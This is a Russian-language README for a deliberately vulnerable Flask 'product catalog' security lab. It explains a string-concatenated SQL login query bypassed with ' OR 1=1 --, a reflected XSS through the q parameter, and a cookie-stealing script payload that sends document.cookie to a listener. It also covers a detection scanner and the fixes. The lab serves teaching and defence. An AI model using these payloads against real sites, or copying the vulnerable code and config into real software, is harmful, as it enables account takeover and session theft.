# Security Lab — Каталог товаров (SQLi + Reflected XSS)

> ⚠️ **Дисклеймер.** Проект создан исключительно в образовательных целях.

Учебное Flask-приложение «каталог товаров» с двумя намеренными уязвимостями:

- **SQL-инъекция** в `/login` — обход аутентификации и вход в админ-панель.
- **Reflected XSS** на главной странице — исполнение JavaScript через параметр `q`.

В комплекте — скрипт `scaner.py`, который автоматически детектирует обе уязвимости.

## Стек

- Python 3
- Flask
- SQLite3 (встроенная библиотека)
- `requests` (для сканера)

## Структура проекта

```
.
├── app.py            # Flask-приложение (уязвимое, с закомментированными патчами)
├── scaner.py         # автоматический сканер уязвимостей (XSS + SQLi)
├── templates/
│   ├── index.html    # каталог товаров + поиск (уязвим к reflected XSS)
│   ├── login.html    # форма входа (уязвима к SQLi)
│   └── admin.html    # панель администратора: изменение цены товара
└── shop.db           # создаётся автоматически при первом запуске
```

### Таблицы БД (`shop.db`)

**users**

| Поле       | Тип      | Описание                |
|------------|----------|-------------------------|
| `id`       | INTEGER  | PK, AUTOINCREMENT       |
| `username` | TEXT     | Логин (UNIQUE, NOT NULL)|
| `password` | TEXT     | Пароль (NOT NULL)       |

Предустановленный пользователь: **`admin` / `admin123`** (создаётся через `INSERT OR IGNORE`).

**products**

| Поле          | Тип     | Описание          |
|---------------|---------|-------------------|
| `id`          | INTEGER | PK, AUTOINCREMENT |
| `name`        | TEXT    | Название (NOT NULL)|
| `price`       | REAL    | Цена (NOT NULL)   |
| `description` | TEXT    | Описание          |

При первом запуске добавляются 5 товаров: ноутбук, наушники, клавиатура, мышь, монитор.

## Маршруты

| Метод    | Путь      | Описание                                                                  |
|----------|-----------|---------------------------------------------------------------------------|
| GET      | `/`       | Каталог + поиск по `q` (уязвим к reflected XSS)                           |
| GET/POST | `/login`  | Вход. SQL собирается конкатенацией строк (уязвим к SQLi)                  |
| GET      | `/logout` | Сброс сессии, редирект на `/login`                                        |
| GET/POST | `/admin`  | Доступ только при `session["is_admin"]`. Обновление цены по `product_id`  |

Особенности конфигурации в `app.py`:

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=False,   # куки доступны из JS — нужно для демонстрации
)

app.run(debug=True)                  # Werkzeug debugger включён (только для лабы!)
```

## Уязвимости

### 1. SQL-инъекция (`POST /login`)

Запрос собирается конкатенацией строк:

```python
query = (
    "SELECT id, username FROM users WHERE username = '"
    + username
    + "' AND password = '"
    + password
    + "'"
)
user = connection.execute(query).fetchone()
```

Полезная нагрузка в поле `username`:

```
' OR 1=1 --
```

Итоговый SQL:

```sql
SELECT id, username FROM users WHERE username = '' OR 1=1 --' AND password = 'x'
```

- `' OR 1=1` делает условие всегда истинным.
- `--` комментирует остаток запроса (проверку пароля).

Возвращается первая запись из `users` (это `admin`). Приложение ставит
`session["is_admin"] = True` и редиректит на `/admin` — обход аутентификации
без знания пароля.

### 2. Reflected XSS (`GET /?q=...`)

В `templates/index.html`:

```html
<p style="text-align: center; font-size: 18px;">
    Вы искали: {{ search|safe }}
</p>
```

Фильтр `|safe` отключает автоматическое HTML-экранирование, поэтому значение
параметра `q` попадает в HTML как есть. Полезная нагрузка:

```
http://127.0.0.1:5000/?q=<script>alert(1)</script>
```

Скрипт исполняется в браузере жертвы. Это **reflected** XSS: payload не
сохраняется в БД, а доставляется через URL и срабатывает при открытии
специально сформированной ссылки.

> 💡 Уязвимость усиливается тем, что `SESSION_COOKIE_HTTPONLY=False` —
> из JavaScript доступно `document.cookie`. В связке с XSS это позволяет
> увести сессию администратора.

## Автоматическая проверка (`scaner.py`)

Скрипт делает две проверки:

1. **XSS** — `GET /?q=<script>alert(1)</script>`, проверяет, что payload
   вернулся в теле ответа без экранирования.
2. **SQLi** — `POST /login` с `username="' OR 1=1 --"`, `password="x"`,
   без перехода по редиректу. Проверяет ответ `302` и `Location: /admin`.

Запуск:

```bash
python scaner.py
```

Ожидаемый вывод на уязвимой версии:

```
[!] Уязвимость XSS обнаружена!
Пейлоад: <script>alert(1)</script>
Параметр: q
[!] Уязвимость SQL-Injection обнаружена!
Пейлоад: ' OR 1=1 --
Параметр: username
```

На исправленной версии — сообщения `[-] ... не обнаружен(а)`.

## Запуск

```bash
# 1. Установить зависимости
pip install flask requests

# 2. Запустить приложение
python app.py          # http://127.0.0.1:5000

# 3. В отдельном терминале — сканер
python scaner.py
```

## Ручная эксплуатация

### SQLi — вход в админку без пароля

1. Открыть `/login`.
2. В поле **Логин** ввести: `' OR 1=1 --`
3. В поле **Пароль** ввести любой символ, например `x`.
4. Нажать «Войти» → приложение редиректит на `/admin` под `admin`.

### Reflected XSS — исполнение скрипта

1. Открыть в браузере:
   `http://127.0.0.1:5000/?q=<script>alert(1)</script>`
2. Браузер выполнит `alert(1)`.
3. Более опасный пример (кража куки на свой локальный listener):

   ```html
   <script>fetch('http://127.0.0.1:1337/steal?c='+encodeURIComponent(document.cookie))</script>
   ```

   Закодировать payload в URL (`?q=...`) и отправить жертве ссылку.

## Патчинг

### SQLi — параметризованный запрос

Безопасный вариант уже лежит рядом в `app.py` (закомментирован):

```python
# Опасный способ
query = (
    "SELECT id, username FROM users WHERE username = '"
    + username
    + "' AND password = '"
    + password
    + "'"
)
user = connection.execute(query).fetchone()

# Безопасный способ
user = connection.execute(
    """
    SELECT id, username
    FROM users
    WHERE username = ? AND password = ?
    """,
    (username, password),
).fetchone()
```

Параметры передаются драйверу отдельно от SQL-текста — SQLite сам их
экранирует, внедрить код через `username`/`password` невозможно.

### XSS — включить автоэкранирование

В `templates/index.html` убрать `|safe`:

```html
<!-- Опасный способ -->
Вы искали: {{ search|safe }}

<!-- Безопасный способ -->
Вы искали: {{ search }}
```

Без `|safe` Flask автоматически экранирует `<`, `>`, `&`, `"`, `'` —
payload выводится как текст и не исполняется.

